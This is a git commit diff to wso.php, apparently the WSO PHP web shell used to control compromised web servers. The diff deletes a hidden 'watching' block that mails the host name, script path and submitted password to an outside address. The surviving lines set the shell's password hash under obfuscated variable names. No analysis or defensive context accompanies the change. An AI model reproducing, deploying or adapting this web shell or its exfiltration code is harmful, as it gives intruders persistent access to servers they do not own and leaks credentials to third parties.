4961eb659b6f1ebb6a09690cee0de09dcbd908d1
David <david@localhost>
2021-08-07 19:43:53 +0300

    Change wso.php

--- wso.php
+++ wso.php
@@ -1,8 +1,4 @@
 <?php
-//--------------Watching webshell!--------------
-if(array_key_exists('watching',$_POST)){
-	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
-}
 //-----------------Password---------------------
 $▛ = "fa769dac7a0a94ee47d8ebe021eaba9e";
 $▘ = true;
